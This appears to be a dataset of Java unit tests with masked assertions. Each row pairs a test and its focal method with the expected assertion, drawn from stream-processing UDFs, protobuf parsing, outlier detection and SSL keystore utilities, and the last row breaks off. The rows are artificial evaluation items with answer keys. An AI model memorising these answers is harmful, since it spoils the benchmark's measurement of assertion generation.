"Exception { long timeStampInSeconds = 100;  Timestamp timestamp = Timestamp.newBuilder().setSeconds(timeStampInSeconds).build(); TestBookingLogMessage testBookingLogMessage = TestBookingLogMessage.newBuilder().setEventTimestamp(timestamp).build(); TestEnrichedBookingLogMessage testEnrichedBookingLogMessage = TestEnrichedBookingLogMessage.newBuilder().setBookingLog(testBookingLogMessage).build();  DynamicMessage dynamicMessage = DynamicMessage.newBuilder(testEnrichedBookingLogMessage).build();  SelectFields selectFields = new SelectFields(stencilClient); selectFields.open(functionContext); Object[] locationNameList = selectFields.eval(Collections.singletonList(dynamicMessage), ""booking_log.event_timestamp.seconds""); ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(value = ""RAW"", bridgedTo = List.class) List<DynamicMessage> filteredData, String fieldPath) { ArrayList<Object> output = new ArrayList<>(filteredData.size()); List<String> keys = new LinkedList<>(Arrays.asList(fieldPath.split(""\\."")));  filteredData.forEach(dynamicMessage -> { output.add(messageParser.read(dynamicMessage, keys)); }); return output.toArray(new Object[0]); }"	assertEquals(locationNameList[0], timeStampInSeconds)
"Exception { long timeStampInSeconds = 100; Timestamp timestamp = Timestamp.newBuilder().setSeconds(timeStampInSeconds).build();  TestBookingLogMessage testBookingLogMessage = TestBookingLogMessage.newBuilder().setEventTimestamp(timestamp).build(); ByteString testEnrichedBookingLogByteMessage = TestEnrichedBookingLogMessage.newBuilder().setBookingLog(testBookingLogMessage).build().toByteString();  ByteString[] byteStrings = new ByteString[1]; byteStrings[0] = testEnrichedBookingLogByteMessage; SelectFields selectFields = new SelectFields(stencilClient);  selectFields.open(functionContext); Object[] selectedFields = selectFields.eval(byteStrings, ""org.raystack.dagger.consumer.TestEnrichedBookingLogMessage"", ""booking_log.event_timestamp.seconds"");  ""<AssertPlaceHolder>""; }
eval(@DataTypeHint(inputGroup = InputGroup.ANY) Object inputProtoBytes, String protoClassName, String fieldPath) throws InvalidProtocolBufferException, ClassNotFoundException { if (!(inputProtoBytes instanceof ByteString[])) { return null; } ByteString[] inputData = (ByteString[]) inputProtoBytes; Descriptors.Descriptor descriptor = getDescriptor(protoClassName);  ArrayList<Object> output = new ArrayList<>(inputData.length); List<String> keys = new LinkedList<>(Arrays.asList(fieldPath.split(""\\."")));  for (ByteString protoByte : inputData) { DynamicMessage dynamicMessage = DynamicMessage.parseFrom(descriptor, protoByte); output.add(messageParser.read(dynamicMessage, keys)); } return output.toArray(new Object[0]); }"	assertEquals(selectedFields[0], 100L)
"shouldCollectSplittedString() { String inputString = ""1234567890 0987654321 000000000""; String[] arrayString = splitUDF.eval(inputString, "" "");  Assert.""<AssertPlaceHolder>"";  }
eval(String input, String delimiter) { if (input == null || delimiter == null) { LOGGER.info(""Not able to split input string, either input string or delimiter is null""); return new String[0]; } if (delimiter.equals("""")) { delimiter = "" ""; }  return input.split(delimiter); }"	"assertArrayEquals(arrayString, inputString.split("" ""))"
"shouldSetSeparatorToSpaceIfInputSeparatorIsEmptyString() { String inputString = ""1234567890 0987654321 000000000""; String[] arrayString = splitUDF.eval(inputString, """");  Assert.""<AssertPlaceHolder>""; }
eval(String input, String delimiter) { if (input == null || delimiter == null) { LOGGER.info(""Not able to split input string, either input string or delimiter is null""); return new String[0]; } if (delimiter.equals("""")) { delimiter = "" ""; }  return input.split(delimiter); }"	"assertArrayEquals(arrayString, inputString.split("" ""))"
"shouldReturnEmptyArrayWhenDelimiterIsNull() { String delimiter = null; String[] arrayString = splitUDF.eval(""1234567890 0987654321 000000000"", delimiter);  Assert.""<AssertPlaceHolder>""; }
eval(String input, String delimiter) { if (input == null || delimiter == null) { LOGGER.info(""Not able to split input string, either input string or delimiter is null""); return new String[0]; } if (delimiter.equals("""")) { delimiter = "" ""; }  return input.split(delimiter); }"	assertEquals(0, arrayString.length)
"shouldGiveTimestampOfFirstDateOfTheMonthForAGivenDateInTimezoneIST() { long startOfMonthTimestamp = startOfMonth.eval(Long.parseLong(""1562224758""), ""Asia/Kolkata""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.DATE, 1); cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1561919400""), startOfMonthTimestamp)"
"shouldGiveTimestampOfFirstDateOfTheMonthForAGivenDateInTimezoneUTC() { long startOfMonthTimestamp = startOfMonth.eval(Long.parseLong(""1562224758""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.DATE, 1); cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1561939200""), startOfMonthTimestamp)"
"shouldGiveTimestampOfFirstDateOfTheMonthForAGivenDateInTimezoneWIB() { long startOfMonthTimestamp = startOfMonth.eval(Long.parseLong(""1562224758""), ""Asia/Jakarta""); ""<AssertPlaceHolder>""; }
eval(Long seconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.DATE, 1); cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1561914000""), startOfMonthTimestamp)"
"shouldTimestampAtEarliestGivenDayIST() { long earliestTimestamp = startOfWeek.eval(Long.parseLong(""1562224758000""), ""Asia/Kolkata""); ""<AssertPlaceHolder>""; }
eval(Long milliseconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliseconds));  cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1561919400000""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayWIB() { long earliestTimestamp = startOfWeek.eval(Long.parseLong(""1562224758000""), ""Asia/Jakarta""); ""<AssertPlaceHolder>""; }
eval(Long milliseconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliseconds));  cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1561914000000""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayUTC() { long earliestTimestamp = startOfWeek.eval(Long.parseLong(""1562224758000""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long milliseconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliseconds));  cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1561939200000""), earliestTimestamp)"
"shouldTimestampAtEarliestGivenDayUTCWithEventTimestampIsMondayDayStart() { long earliestTimestamp = startOfWeek.eval(Long.parseLong(""1561939200000""), ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long milliseconds, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(milliseconds));  cal.set(Calendar.HOUR_OF_DAY, FIRST_HOUR_OF_DAY); cal.clear(Calendar.MINUTE); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND); cal.set(Calendar.DAY_OF_WEEK, cal.getFirstDayOfWeek() - DURATION_OF_DAY_IN_SECONDS);  return cal.getTimeInMillis(); }"	"assertEquals(Long.parseLong(""1561939200000""), earliestTimestamp)"
"shouldReturnTimestampOfDayAtGivenHourAndMinuteIST() { long earliestTimestamp = timeInDate.eval(Long.parseLong(""1562224758""), 21, 0, ""Asia/Kolkata""); ""<AssertPlaceHolder>""; }
eval(Long seconds, Integer hour, Integer minute, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, hour); cal.set(Calendar.MINUTE, minute); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1562254200""), earliestTimestamp)"
"shouldReturnTimestampOfDayAtGivenHourAndMinuteWIB() { long earliestTimestamp = timeInDate.eval(Long.parseLong(""1562224758""), 21, 0, ""Asia/Jakarta""); ""<AssertPlaceHolder>""; }
eval(Long seconds, Integer hour, Integer minute, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, hour); cal.set(Calendar.MINUTE, minute); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1562248800""), earliestTimestamp)"
"shouldReturnTimestampOfDayAtGivenHourAndMinuteUTC() { long earliestTimestamp = timeInDate.eval(Long.parseLong(""1562224758""), 21, 0, ""UTC""); ""<AssertPlaceHolder>""; }
eval(Long seconds, Integer hour, Integer minute, String timeZone) { Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(timeZone)); cal.setTime(new Date(seconds * SECOND_IN_MILLIS));  cal.set(Calendar.HOUR_OF_DAY, hour); cal.set(Calendar.MINUTE, minute); cal.clear(Calendar.SECOND); cal.clear(Calendar.MILLISECOND);  return cal.getTimeInMillis() / SECOND_IN_MILLIS; }"	"assertEquals(Long.parseLong(""1562274000""), earliestTimestamp)"
"ParseException { SimpleDateFormat dateFormater = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss z""); TimestampFromUnix timestampFromUnix = new TimestampFromUnix(); long unixTimestamp = 1554101494; Timestamp expectedDate = new Timestamp(dateFormater.parse(""2019-04-01 13:51:34 WIB"").getTime()); Assert.""<AssertPlaceHolder>""; }
eval(Long seconds) { return new Timestamp(Math.abs(seconds) * SECONDS_TO_MILISECONDS); }"	assertEquals(expectedDate, timestampFromUnix.eval(unixTimestamp))
"ParseException { SimpleDateFormat dateFormater = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss z""); TimestampFromUnix timestampFromUnix = new TimestampFromUnix(); long unixTimestamp = -1554101494; Timestamp expectedDate = new Timestamp(dateFormater.parse(""2019-04-01 13:51:34 WIB"").getTime()); Assert.""<AssertPlaceHolder>""; }
eval(Long seconds) { return new Timestamp(Math.abs(seconds) * SECONDS_TO_MILISECONDS); }"	assertEquals(expectedDate, timestampFromUnix.eval(unixTimestamp))
"ParseException { SimpleDateFormat dateFormater = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss z""); TimestampFromUnix timestampFromUnix = new TimestampFromUnix(); long unixTimestamp = 0; Timestamp expectedDate = new Timestamp(dateFormater.parse(""1970-01-01 07:00:00 WIB"").getTime()); Assert.""<AssertPlaceHolder>""; }
eval(Long seconds) { return new Timestamp(Math.abs(seconds) * SECONDS_TO_MILISECONDS); }"	assertEquals(expectedDate, timestampFromUnix.eval(unixTimestamp))
"shouldGetExistingListGivenName() { String jsonData = "" { ""data"" : [ ""listContent"" ] } "";  when(gcsClient.fetchJsonData(any(), any(), any(), anyString())).thenReturn(jsonData); SetCache setCache = new SetCache(new HashSet<>(listContent)); Assert.""<AssertPlaceHolder>""; }
getSet(String setName) {  return new SetCache(getSetOfObjects(setName)); }"	assertEquals(setCache, gcsDataStore.getSet(defaultListName))
"shouldGetExistingMapGivenName() {  String jsonData = "" { ""key"" :  ""value""  } ""; when(gcsClient.fetchJsonData(any(), any(), any(), anyString())).thenReturn(jsonData); MapCache mapCache = new MapCache(new HashMap<>(mapContent));  Assert.""<AssertPlaceHolder>""; }
getMap(String mapName) { Map<String, String> mapOfObjects = getMapOfObjects(mapName); return new MapCache(mapOfObjects); }"	assertEquals(mapCache, gcsDataStore.getMap(defaultMapName))
"shouldReturnValueWhenKeyExist() { MapCache mapCache = new MapCache(someContent);  ""<AssertPlaceHolder>""; }
get(String key) { String value = cache.get(key); if (value == null) { throw new KeyDoesNotExistException(String.format(""Key ""%s"" does not exist"", key)); } return value; }"	assertEquals(defaultValue, mapCache.get(defaultKey))
"InvocationTargetException { Optional<Element> element = Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""service_type"");  ""<AssertPlaceHolder>""; }
initialize(Element parent, Row row, CustomDescriptor parentDescriptor, String pathElement) { Optional<Descriptors.FieldDescriptor> fieldDescriptor = parentDescriptor.getFieldDescriptor(pathElement); if (!fieldDescriptor.isPresent()) { return Optional.empty(); } if (fieldDescriptor.get().getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE) { return Optional.of(new RowElement(parent, row, fieldDescriptor.get())); } return Optional.of(new ValueElement(parent, row, fieldDescriptor.get())); }"	assertEquals(ValueElement.class, element.get().getClass())
"InvocationTargetException { Optional<Element> element = Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""routes"");  ""<AssertPlaceHolder>""; }
initialize(Element parent, Row row, CustomDescriptor parentDescriptor, String pathElement) { Optional<Descriptors.FieldDescriptor> fieldDescriptor = parentDescriptor.getFieldDescriptor(pathElement); if (!fieldDescriptor.isPresent()) { return Optional.empty(); } if (fieldDescriptor.get().getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE) { return Optional.of(new RowElement(parent, row, fieldDescriptor.get())); } return Optional.of(new ValueElement(parent, row, fieldDescriptor.get())); }"	assertEquals(RowElement.class, element.get().getClass())
"InvocationTargetException { Optional<Element> element = Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""invalid"");  ""<AssertPlaceHolder>""; }
initialize(Element parent, Row row, CustomDescriptor parentDescriptor, String pathElement) { Optional<Descriptors.FieldDescriptor> fieldDescriptor = parentDescriptor.getFieldDescriptor(pathElement); if (!fieldDescriptor.isPresent()) { return Optional.empty(); } if (fieldDescriptor.get().getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE) { return Optional.of(new RowElement(parent, row, fieldDescriptor.get())); } return Optional.of(new ValueElement(parent, row, fieldDescriptor.get())); }"	assertEquals(Optional.empty(), element)
"InvocationTargetException { RowElement element = (RowElement) Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""routes"").get();  Optional<Element> next = element.createNext(""start"");  ""<AssertPlaceHolder>""; }
createNext(String pathElement) { Optional<Element> childElement = initialize(this, null, new CustomDescriptor(getFieldDescriptor().getMessageType()), pathElement); return childElement; }"	assertEquals(RowElement.class, next.get().getClass())
"InvocationTargetException { RowElement element = (RowElement) Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""routes"").get();  Optional<Element> next = element.createNext(""distance_in_kms"");  ""<AssertPlaceHolder>""; }
createNext(String pathElement) { Optional<Element> childElement = initialize(this, null, new CustomDescriptor(getFieldDescriptor().getMessageType()), pathElement); return childElement; }"	assertEquals(ValueElement.class, next.get().getClass())
"InvocationTargetException { RowElement element = (RowElement) Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""routes"").get();  Optional<Element> next = element.createNext(""path"");  ""<AssertPlaceHolder>""; }
createNext(String pathElement) { Optional<Element> childElement = initialize(this, null, new CustomDescriptor(getFieldDescriptor().getMessageType()), pathElement); return childElement; }"	assertEquals(Optional.empty(), next)
"InvocationTargetException { ValueElement element = (ValueElement) Element.initialize(null, null, new CustomDescriptor(getDescriptor(""org.raystack.dagger.consumer.TestBookingLogMessage"")), ""service_type"").get();  Optional<Element> next = element.createNext(""valid_path_not_possible"");  ""<AssertPlaceHolder>""; }
createNext(String pathElement) { return Optional.empty(); }"	assertEquals(Optional.empty(), next)
"shouldReadFromSingleField() { String orderNumber = ""test_order_id""; TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.newBuilder().setOrderNumber(orderNumber).build(); DynamicMessage dynamicMessage = DynamicMessage.newBuilder(bookingLogMessage).build(); MessageParser messageParser = new MessageParser(); ArrayList<String> keys = new ArrayList<>(); keys.add(0, ""order_number"");  Object value = messageParser.read(dynamicMessage, keys);  ""<AssertPlaceHolder>""; }
read(DynamicMessage dynamicMessage, List<String> keys) { Descriptors.Descriptor parentDescriptor = dynamicMessage.getDescriptorForType(); String key = keys.get(0); Descriptors.FieldDescriptor fieldByName = getFieldByName(key, parentDescriptor); if (keys.size() == 1) { Object resultField = dynamicMessage.getField(fieldByName); return parseSingleRow(fieldByName, resultField); } else { ArrayList<String> remainingKeys = new ArrayList<>(keys.subList(1, keys.size())); return read((DynamicMessage) dynamicMessage.getField(fieldByName), remainingKeys); } }"	assertEquals(value, orderNumber)
"shouldReadFromNestedField() { long timeStampInSeconds = 100;  Timestamp timestamp = Timestamp.newBuilder().setSeconds(timeStampInSeconds).build(); TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.newBuilder().setEventTimestamp(timestamp).build(); TestEnrichedBookingLogMessage enrichedBookingLogMessage = TestEnrichedBookingLogMessage.newBuilder().setBookingLog(bookingLogMessage).build();  DynamicMessage dynamicMessage = DynamicMessage.newBuilder(enrichedBookingLogMessage).build();  MessageParser messageParser = new MessageParser();  ArrayList<String> keys = new ArrayList<>(); keys.add(0, ""booking_log""); keys.add(1, ""event_timestamp""); keys.add(2, ""seconds"");  Object value = messageParser.read(dynamicMessage, keys);  ""<AssertPlaceHolder>""; }
read(DynamicMessage dynamicMessage, List<String> keys) { Descriptors.Descriptor parentDescriptor = dynamicMessage.getDescriptorForType(); String key = keys.get(0); Descriptors.FieldDescriptor fieldByName = getFieldByName(key, parentDescriptor); if (keys.size() == 1) { Object resultField = dynamicMessage.getField(fieldByName); return parseSingleRow(fieldByName, resultField); } else { ArrayList<String> remainingKeys = new ArrayList<>(keys.subList(1, keys.size())); return read((DynamicMessage) dynamicMessage.getField(fieldByName), remainingKeys); } }"	assertEquals(value, timeStampInSeconds)
"shouldConvertEnumToStringField() { TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.newBuilder().setStatus(TestBookingStatus.Enum.COMPLETED).build(); DynamicMessage dynamicMessage = DynamicMessage.newBuilder(bookingLogMessage).build(); MessageParser messageParser = new MessageParser(); ArrayList<String> keys = new ArrayList<>(); keys.add(0, ""status"");  Object value = messageParser.read(dynamicMessage, keys); ""<AssertPlaceHolder>""; }
read(DynamicMessage dynamicMessage, List<String> keys) { Descriptors.Descriptor parentDescriptor = dynamicMessage.getDescriptorForType(); String key = keys.get(0); Descriptors.FieldDescriptor fieldByName = getFieldByName(key, parentDescriptor); if (keys.size() == 1) { Object resultField = dynamicMessage.getField(fieldByName); return parseSingleRow(fieldByName, resultField); } else { ArrayList<String> remainingKeys = new ArrayList<>(keys.subList(1, keys.size())); return read((DynamicMessage) dynamicMessage.getField(fieldByName), remainingKeys); } }"	"assertEquals(value, ""COMPLETED"")"
"shouldCreateExpressionForSingleExpression() { String operationType = ""distinct""; aggregationExpression.createExpression(operationType);  Assert.""<AssertPlaceHolder>""; }
getExpressionString() { return expressionString; }"	"assertEquals(aggregationExpression.getExpressionString(), ""stream.distinct()"")"
"shouldCreateExpressionForMultipleExpression() { String operationType = ""distinct.sorted.sum""; aggregationExpression.createExpression(operationType);  Assert.""<AssertPlaceHolder>""; }
getExpressionString() { return expressionString; }"	"assertEquals(aggregationExpression.getExpressionString(), ""stream.distinct().sorted().sum()"")"
"shouldCreateExpressionForSingleExpression() { String operationType = ""distinct""; operationExpression.createExpression(operationType);  Assert.""<AssertPlaceHolder>""; }
getExpressionString() { return expressionString; }"	"assertEquals(operationExpression.getExpressionString(), ""stream.distinct().toArray()"")"
"shouldCreateExpressionForMultipleExpression() { String operationType = ""distinct.sorted""; operationExpression.createExpression(operationType);  Assert.""<AssertPlaceHolder>""; }
getExpressionString() { return expressionString; }"	"assertEquals(operationExpression.getExpressionString(), ""stream.distinct().sorted().toArray()"")"
"shouldFlattenOptionalOutput() { OptionalInt optionalInt = OptionalInt.empty(); when(aggregationExpression.getExpressionString()).thenReturn(""test-expression""); when(jexlEngine.createScript(""test-expression"")).thenReturn(jexlScript); when(jexlScript.execute(jexlContext)).thenReturn(optionalInt); arrayAggregateProcessor = new ArrayAggregateProcessor(jexlEngine, jexlContext, jexlScript, aggregationExpression); Object[] objects = new Object[1]; objects[0] = 1L; arrayAggregateProcessor.initJexl(LongbowArrayType.BIGINT, objects); Object result = arrayAggregateProcessor.process(); Assert.""<AssertPlaceHolder>""; }
process() { try { Object result = getJexlScript().execute(getJexlContext()); return getValueFromOptionalOutput(result); } catch (RuntimeException e) { throw new ArrayAggregationException(e); } }"	assertEquals(result, 0)
"shouldReturnEmptyListIfMadZero() { ArrayList<Point> points = new ArrayList<>(); points.add(new Point(new Timestamp(1L), 1D, true)); points.add(new Point(new Timestamp(2L), 4D, true)); points.add(new Point(new Timestamp(3L), 4D, true)); points.add(new Point(new Timestamp(4L), 4D, true)); points.add(new Point(new Timestamp(5L), 5D, true)); points.add(new Point(new Timestamp(6L), 5D, true)); points.add(new Point(new Timestamp(7L), 5D, true)); points.add(new Point(new Timestamp(8L), 5D, true)); points.add(new Point(new Timestamp(9L), 5D, true)); points.add(new Point(new Timestamp(10L), 5D, true)); points.add(new Point(new Timestamp(11L), 5D, true)); points.add(new Point(new Timestamp(12L), 5D, true)); points.add(new Point(new Timestamp(13L), 5D, true)); points.add(new Point(new Timestamp(14L), 5D, true)); Mad mad = new Mad(points, 3); List<Point> outliers = mad.getOutliers(); ""<AssertPlaceHolder>""; }
getOutliers() { ArrayList<Double> doubleMAD; try { doubleMAD = getDoubleMAD(); } catch (Exception e) { LOGGER.info(e.getMessage()); return Collections.emptyList(); }  setDistanceFromMAD(doubleMAD); for (Point point : points) { if (point.isObservable() && point.getDistanceFromMad() > this.tolerance) { point.setOutlier(true); } } return points.stream().filter(Point::isOutlier).collect(Collectors.toList()); }"	assertEquals(0, outliers.size())
"shouldReturnEmptyListIfMedianCannotBeCalculatedZero() { ArrayList<Point> points = new ArrayList<>(); Mad mad = new Mad(points, 3); List<Point> outliers = mad.getOutliers(); ""<AssertPlaceHolder>""; }
getOutliers() { ArrayList<Double> doubleMAD; try { doubleMAD = getDoubleMAD(); } catch (Exception e) { LOGGER.info(e.getMessage()); return Collections.emptyList(); }  setDistanceFromMAD(doubleMAD); for (Point point : points) { if (point.isObservable() && point.getDistanceFromMad() > this.tolerance) { point.setOutlier(true); } } return points.stream().filter(Point::isOutlier).collect(Collectors.toList()); }"	assertEquals(0, outliers.size())
"IOException { String sample = ""{""items"": [{""tableName"": ""tableName"", ""columnNames"": [""id""], ""rows"": [[""1234""], [null]]}]}""; InputStream input = new ByteArrayInputStream(sample.getBytes(StandardCharsets.UTF_8)); JsonObject params = new JsonObject(); params.addProperty(""header"",""items.0.columnNames"" ); params.addProperty(""data"",""items.0.rows"" ); params.addProperty(""fields"",""items.0.tableName"" ); InputStreamProcessor processor = new AggregatedJsonProcessor(params); InputStream output = processor.process(input); JsonElement json = new JsonParser().parse(new InputStreamReader(output, StandardCharsets.UTF_8)); JsonObject jsonObject = json.getAsJsonObject(); Assert.""<AssertPlaceHolder>""; }
process(InputStream inputStream) throws IOException { Preconditions.checkArgument(parameters.has(""header"")); Preconditions.checkArgument(parameters.has(""data""));   String unwrapPath = parameters.has(""unwrap"") ? parameters.get(""unwrap"").getAsString() : StringUtils.EMPTY; String headerPath = parameters.get(""header"").getAsString(); String dataPath = parameters.get(""data"").getAsString(); String[] otherFields = parameters.has(""fields"") ? parameters.get(""fields"").getAsString().split(KEY_WORD_COMMA) : new String[0];  Path path = Files.createTempFile(null, null); File file = path.toFile(); file.deleteOnExit(); file.setReadable(true, true); if(inputStream != null) { JsonObject processed = new JsonObject(); JsonElement input = new JsonParser().parse(new InputStreamReader(inputStream, StandardCharsets.UTF_8)); if(!unwrapPath.isEmpty()) { input = JsonUtils.get(Arrays.stream(unwrapPath.split(""\\."")).iterator(), input); }  if(input != JsonNull.INSTANCE && input.isJsonObject()) { JsonElement header = JsonUtils.get(input.getAsJsonObject(), headerPath); JsonElement data = JsonUtils.get(input.getAsJsonObject(), dataPath);  if(header != JsonNull.INSTANCE && data != JsonNull.INSTANCE && header.isJsonArray() && data.isJsonArray()) { JsonArray rows = new JsonArray(); int n = header.getAsJsonArray().size(); int recCount = 0; for(JsonElement row: data.getAsJsonArray()) { JsonObject record = new JsonObject(); for(int i = 0; i < n; i++) { record.add(header.getAsJsonArray().get(i).getAsString(), row.getAsJsonArray().get(i)); } recCount ++; rows.add(record); } processed.addProperty(""count"", recCount); processed.add(""results"", rows);  for(String jsonPath: otherFields) { String[] segments = jsonPath.split(""\\.""); if(segments.length > 0) { String name = segments[segments.length - 1]; JsonElement field = JsonUtils.get(input.getAsJsonObject(), jsonPath); if(field != JsonNull.INSTANCE) { processed.add(name, field); } } }  } } else if(input.isJsonArray()) { // TODO } OutputStreamWriter writer = new OutputStreamWriter(new FileOutputStream(path.toFile()), StandardCharsets.UTF_8); writer.write(processed.toString()); writer.flush(); writer.close(); } return Files.newInputStream(path); }"	assertTrue(jsonObject.entrySet().size() == 3)
"testSetSinkPipelineName() { sut.setSinkPipelineName(SINK_PIPELINE_NAME);  try { sut.output(recordList); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
output(final Collection<T> records) { if (buffer != null && !isStopRequested.get()) { for (T record : records) { while (true) { try { buffer.write(record, DEFAULT_WRITE_TIMEOUT); break; } catch (TimeoutException ex) { LOG.error(""PipelineConnector [{}-{}]: Timed out writing to pipeline [{}]"", sinkPipelineName, sourcePipelineName, sourcePipelineName, ex); } }  } } else { LOG.error(""PipelineConnector [{}-{}]: Pipeline [{}] is currently not initialized or has been halted"", sinkPipelineName, sourcePipelineName, sourcePipelineName); throw new RuntimeException(format(""PipelineConnector [%s-%s]: Pipeline [%s] is not active, "" + ""cannot proceed"", sinkPipelineName, sourcePipelineName, sourcePipelineName)); } }"	assertTrue(e.getMessage().contains(SINK_PIPELINE_NAME))
"testCreateCloudWatchMeterRegistry() { final CloudWatchMeterRegistryProvider cloudWatchMeterRegistryProvider = new CloudWatchMeterRegistryProvider( TEST_CLOUDWATCH_PROPERTIES, cloudWatchAsyncClient); final CloudWatchMeterRegistry cloudWatchMeterRegistry = cloudWatchMeterRegistryProvider.getCloudWatchMeterRegistry(); ""<AssertPlaceHolder>""; }
getCloudWatchMeterRegistry() { return this.cloudWatchMeterRegistry; }"	assertThat(cloudWatchMeterRegistry, notNullValue())
"testLoadP12KeyStore() { SSLContext result = SslUtil.createSslContext(P12_KEYSTORE, """", """"); ""<AssertPlaceHolder>""; }
createSslContext(final String keyStoreFilePath, final String keyStorePassword, final String privateKeyPassword) { final SSLContext sslContext;  try { final KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(Files.newInputStream(Paths.get(keyStoreFilePath)), keyStorePassword.toCharArray());  final KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, privateKeyPassword.toCharArray());  final TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore);  sslContext = SSLContext.getInstance(""TLS""); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null); } catch (Exception e) { throw new IllegalStateException(""Problem loading keystore to create SSLContext"", e); }  return sslContext; }"	"assertEquals(""TLS"", result.getProtocol())"
"testLoadJksKeyStore() { SSLContext result = SslUtil.createSslContext(JKS_KEYSTORE, """", """"); ""<AssertPlaceHolder>""; }
